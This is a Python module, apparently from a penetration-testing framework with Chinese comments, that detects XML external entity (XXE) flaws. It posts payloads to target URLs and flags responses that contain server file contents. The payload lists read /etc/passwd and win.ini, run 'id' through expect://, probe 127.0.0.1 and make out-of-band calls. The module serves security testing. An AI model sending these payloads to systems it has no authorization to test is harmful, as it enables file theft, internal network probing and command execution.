"""XXE 漏洞检测器"""
import re
import time
import urllib.parse
from typing import List
from secops_core.http_client import http_get, http_post
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector


class XXEDetector(BaseDetector):
    """XXE 漏洞检测器"""

    name = "xxe"
    category = "XXE"
    MARKER = "secopsxxed7e8f"

    XML_PAYLOADS = [
        # 基础 XXE 读文件
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root>&xxe;</root>',

        # 参数实体 XXE
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>'
        '<root>test</root>',

        # Blind XXE (外带)
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://httpbin.org/get?data=xxe_blind">%xxe;]>'
        '<root>test</root>',

        # Windows 文件读取
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        '<root>&xxe;</root>',

        # PHP expect
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>'
        '<root>&xxe;</root>',

        # 内网探测
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>'
        '<root>&xxe;</root>',
    ]

    JSON_PAYLOADS = [
        '{"xml": "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>"}',
    ]

    FILE_CONTENT_PATTERNS = [
        r"root:.*:0:0:",
        r"daemon:",
        r"nobody:",
        r"\[fonts\]",
        r"for 16-bit app support",
    ]

    ERROR_PATTERNS = [
        r"xml parser error",
        r"saxparseexception",
        r"xml parsing error",
        r"doctype is disallowed",
        r"entity.*not declared",
        r"external entity",
    ]

    def test(self, target_url: str, params: list = None) -> List[Finding]:
        findings = []

        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if params is None:
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = ["xml", "data", "body", "content", "payload",
                          "request", "input", "param", "document"]

        # XML 格式测试
        headers_list = [
            {"Content-Type": "application/xml"},
            {"Content-Type": "text/xml"},
            {"Content-Type": "application/xhtml+xml"},
        ]

        for param in params:
            for payload in self.XML_PAYLOADS:
                for headers in headers_list:
                    log_audit("XXE_XML", base_url, f"param={param}")
                    status, _, body = http_post(base_url, payload, headers=headers, timeout=8)

                    if status == 0:
                        continue

                    for pattern in self.FILE_CONTENT_PATTERNS:
                        if re.search(pattern, body):
                            findings.append(Finding(
                                vuln_type="XXE", severity="critical",
                                title=f"XXE 文件读取 - 参数 {param}",
                                location=base_url, payload=payload[:200],
                                evidence=f"成功读取服务器文件: {body[:200]}",
                                description=f"通过 XML 外部实体注入读取服务器文件。",
                                remediation="禁用 DTD 解析、禁用外部实体、使用 JSON 替代 XML"
                            ))
                            break

                    if any("XXE" in f.vuln_type and param in f.title for f in findings):
                        break
                    time.sleep(ATTACK_DELAY)

                if any("XXE" in f.vuln_type and param in f.title for f in findings):
                    break

        # JSON 格式测试 (某些应用会解析 JSON 中的 XML)
        for param in params:
            for payload in self.JSON_PAYLOADS:
                test_data = f'{{"{param}": {payload}}}'
                headers = {"Content-Type": "application/json"}

                log_audit("XXE_JSON", base_url, f"param={param}")
                status, _, body = http_post(base_url, test_data, headers=headers, timeout=8)

                if status == 0:
                    continue

                for pattern in self.FILE_CONTENT_PATTERNS:
                    if re.search(pattern, body):
                        findings.append(Finding(
                            vuln_type="XXE", severity="critical",
                            title=f"XXE via JSON - 参数 {param}",
                            location=base_url, payload=payload[:200],
                            evidence=f"通过 JSON 参数触发 XXE: {body[:200]}",
                            description=f"JSON 参数中嵌入的 XML 被解析，存在 XXE 漏洞。",
                            remediation="禁止在 JSON 解析器中处理 XML 实体"
                        ))
                        break

                if any("XXE" in f.vuln_type and "JSON" in f.title and param in f.title for f in findings):
                    break
                time.sleep(ATTACK_DELAY)

        return findings
